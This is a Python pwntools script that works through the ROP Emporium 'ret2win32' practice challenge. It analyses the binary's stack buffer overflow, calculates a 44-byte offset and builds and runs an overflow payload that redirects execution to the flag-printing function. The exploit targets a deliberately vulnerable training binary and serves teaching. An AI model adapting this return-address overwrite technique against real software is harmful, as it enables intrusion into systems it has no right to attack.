#!/usr/bin/env python3
"""
Comprehensive Analysis of ret2win32 Binary
ROP Emporium Challenge - ret2win

This script provides detailed analysis and multiple exploit approaches
for the ret2win32 binary exploitation challenge.
"""

from pwn import *
import struct

# Configure pwntools
context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

class Ret2WinAnalyzer:
    def __init__(self, binary_path='./ret2win32'):
        self.binary_path = binary_path
        self.elf = ELF(binary_path)
        self.ret2win_addr = 0x0804862c
        self.pwnme_addr = 0x080485ad
        self.main_addr = 0x08048546
        
    def analyze_binary(self):
        """Perform comprehensive binary analysis"""
        print("=" * 60)
        print("BINARY ANALYSIS - ret2win32")
        print("=" * 60)
        
        print(f"Architecture: {self.elf.arch}")
        print(f"Entry Point: {hex(self.elf.entry)}")
        print(f"Base Address: {hex(self.elf.address)}")
        
        # Security mitigations
        print("\n[SECURITY MITIGATIONS]")
        print(f"NX (No Execute): {'Enabled' if self.elf.nx else 'Disabled'}")
        print(f"PIE (Position Independent): {'Enabled' if self.elf.pie else 'Disabled'}")
        print(f"Stack Canary: {'Enabled' if self.elf.canary else 'Disabled'}")
        print(f"RELRO: {self.elf.relro}")
        
        # Key functions
        print("\n[KEY FUNCTIONS]")
        print(f"main(): {hex(self.main_addr)}")
        print(f"pwnme(): {hex(self.pwnme_addr)}")
        print(f"ret2win(): {hex(self.ret2win_addr)}")
        
    def analyze_vulnerability(self):
        """Analyze the buffer overflow vulnerability"""
        print("\n" + "=" * 60)
        print("VULNERABILITY ANALYSIS")
        print("=" * 60)
        
        print("[VULNERABILITY TYPE]: Stack Buffer Overflow")
        print("[LOCATION]: pwnme() function")
        print("[ROOT CAUSE]: read() reads 56 bytes into 32-byte buffer")
        
        print("\n[STACK LAYOUT ANALYSIS]")
        print("From pwnme() disassembly:")
        print("  - sub esp, 0x28     ; Allocate 40 bytes (0x28) on stack")
        print("  - lea eax, [ebp-0x28] ; Buffer starts at ebp-40")
        print("  - push 0x38         ; read() size = 56 bytes (0x38)")
        
        print("\n[MEMORY LAYOUT]")
        print("  [ebp-40] -> [ebp-9]  : 32-byte buffer")
        print("  [ebp-8]  -> [ebp-5]  : 4 bytes padding/alignment")
        print("  [ebp-4]  -> [ebp-1]  : 4 bytes padding")
        print("  [ebp]               : 4 bytes saved EBP")
        print("  [ebp+4]             : 4 bytes return address <- TARGET")
        
        print("\n[OFFSET CALCULATION]")
        print("  Buffer size: 32 bytes")
        print("  Padding: 8 bytes")
        print("  Saved EBP: 4 bytes")
        print("  Total offset to return address: 44 bytes")
        
    def analyze_target(self):
        """Analyze the ret2win target function"""
        print("\n" + "=" * 60)
        print("TARGET FUNCTION ANALYSIS")
        print("=" * 60)
        
        print(f"[TARGET]: ret2win() at {hex(self.ret2win_addr)}")
        print("[FUNCTIONALITY]: Prints flag and executes system('/bin/cat flag.txt')")
        
        print("\n[DISASSEMBLY ANALYSIS]")
        print("ret2win() function:")
        print("  0x0804862c: push ebp")
        print("  0x0804862d: mov ebp, esp")
        print("  0x0804862f: sub esp, 0x8")
        print("  0x08048635: push 0x80487f6    ; 'Well done! Here's your flag:'")
        print("  0x0804863a: call puts@plt")
        print("  0x08048645: push 0x8048813    ; '/bin/cat flag.txt'")
        print("  0x0804864a: call system@plt")
        print("  0x08048654: ret")
        
    def calculate_offset_dynamic(self):
        """Dynamically calculate the offset using pattern"""
        print("\n" + "=" * 60)
        print("DYNAMIC OFFSET CALCULATION")
        print("=" * 60)
        
        # Generate cyclic pattern
        pattern = cyclic(100)
        
        try:
            # Start process
            p = process(self.binary_path)
            p.sendlineafter(b'> ', pattern)
            p.wait()
            
            # Get core dump
            core = p.corefile
            
            # Find crash address
            crash_addr = core.eip
            offset = cyclic_find(crash_addr)
            
            print(f"[PATTERN]: {pattern[:20]}...")
            print(f"[CRASH ADDRESS]: {hex(crash_addr)}")
            print(f"[CALCULATED OFFSET]: {offset}")
            
            p.close()
            return offset
            
        except Exception as e:
            print(f"[ERROR]: {e}")
            print("[FALLBACK]: Using static analysis offset = 44")
            return 44
    
    def create_basic_exploit(self):
        """Create basic ret2win exploit"""
        print("\n" + "=" * 60)
        print("BASIC EXPLOIT")
        print("=" * 60)
        
        offset = 44
        payload = b'A' * offset + p32(self.ret2win_addr)
        
        print(f"[PAYLOAD LENGTH]: {len(payload)} bytes")
        print(f"[OFFSET]: {offset}")
        print(f"[TARGET ADDRESS]: {hex(self.ret2win_addr)}")
        print(f"[PAYLOAD]: {payload}")
        
        return payload
    
    def test_exploit(self, payload):
        """Test the exploit"""
        print("\n" + "=" * 60)
        print("EXPLOIT TESTING")
        print("=" * 60)
        
        try:
            p = process(self.binary_path)
            p.sendlineafter(b'> ', payload)
            
            # Receive output
            output = p.recvall(timeout=2).decode()
            print("[OUTPUT]:")
            print(output)
            
            if "Well done" in output:
                print("\n[SUCCESS]: Exploit worked!")
            else:
                print("\n[FAILED]: Exploit did not work")
                
            p.close()
            
        except Exception as e:
            print(f"[ERROR]: {e}")
    
    def run_full_analysis(self):
        """Run complete analysis and exploitation"""
        self.analyze_binary()
        self.analyze_vulnerability()
        self.analyze_target()
        
        # Create and test exploit
        payload = self.create_basic_exploit()
        self.test_exploit(payload)
        
        print("\n" + "=" * 60)
        print("ANALYSIS COMPLETE")
        print("=" * 60)

def main():
    """Main analysis function"""
    analyzer = Ret2WinAnalyzer()
    analyzer.run_full_analysis()

if __name__ == '__main__':
    main()